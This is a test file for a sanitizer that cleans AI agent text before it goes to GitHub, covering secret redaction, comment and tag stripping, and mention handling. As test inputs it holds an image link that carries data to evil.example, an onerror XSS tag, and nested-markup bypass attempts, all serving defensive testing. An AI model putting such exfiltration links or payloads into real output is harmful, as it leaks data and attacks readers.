import { describe, expect, it } from 'vitest';
import { sanitizeForGithub } from './sanitize';

const clean = (text: string, maxLength = 4000) => sanitizeForGithub(text, { allowedMentions: ['maya', 'Leo'], maxLength });

describe('sanitizeForGithub', () => {
  it.each([
    ['a GitHub token', `token ghp_${'a'.repeat(36)} here`],
    ['a fine-grained GitHub token', `github_pat_${'b'.repeat(30)}`],
    ['an Anthropic key', `sk-ant-api03-${'c'.repeat(40)}`],
    ['an AWS key id', 'AKIAABCDEFGHIJKLMNOP'],
    ['a Nitpilot CLI token', `nit_${'d'.repeat(43)}`],
    ['a private key', '-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----'],
  ])('redacts %s', (_label, secret) => {
    const out = clean(`before ${secret} after`);
    expect(out).toContain('[redacted]');
    expect(out).not.toContain(secret);
  });

  it('removes HTML comments, so agent text cannot forge our marker', () => {
    expect(clean('ok <!-- nitpilot:v1 chat=x --> done')).toBe('ok  done');
  });

  it('keeps an image only as its alt text', () => {
    expect(clean('see ![diagram](https://evil.example/x.png?data=secret)')).toBe('see diagram');
  });

  it('strips raw HTML tags', () => {
    expect(clean('a <img src=x onerror=alert(1)> b <b>bold</b>')).toBe('a  b bold');
  });

  it('neutralizes mentions of people outside the PR, keeps the ones inside', () => {
    expect(clean('@maya and @leo, also @someone and @acme/team')).toBe('@maya and @leo, also `@someone` and `@acme/team`');
  });

  it('leaves emails and code alone', () => {
    expect(clean('mail a@b.com or run `npm i @scope/pkg`')).toBe('mail a@b.com or run `npm i @scope/pkg`');
  });

  it.each([
    ['a comment', '<!-<!-- x -->- nitpilot:v1 chat=x -->', '<!--'],
    ['an unclosed comment', 'hi <!-- nitpilot:v1 chat=x', '<!--'],
    ['a tag', '<<b>img src=https://evil.example/?d=1>', '<img'],
    ['an image', '![a![b](https://x.example)](https://evil.example/?d=1)', 'evil.example'],
  ])('cannot be tricked by nesting into leaving %s behind', (_label, input, leftover) => {
    expect(clean(input)).not.toContain(leftover);
  });

  it('leaves mentions inside a fenced code block alone', () => {
    const block = '```\nnpm i @scope/pkg\n@someone\n```';
    expect(clean(`see\n${block}\nthanks @someone`)).toBe(`see\n${block}\nthanks \`@someone\``);
  });

  it('cuts long text with an ellipsis', () => {
    const out = clean('x'.repeat(50), 10);
    expect(out).toHaveLength(10);
    expect(out.endsWith('…')).toBe(true);
  });
});
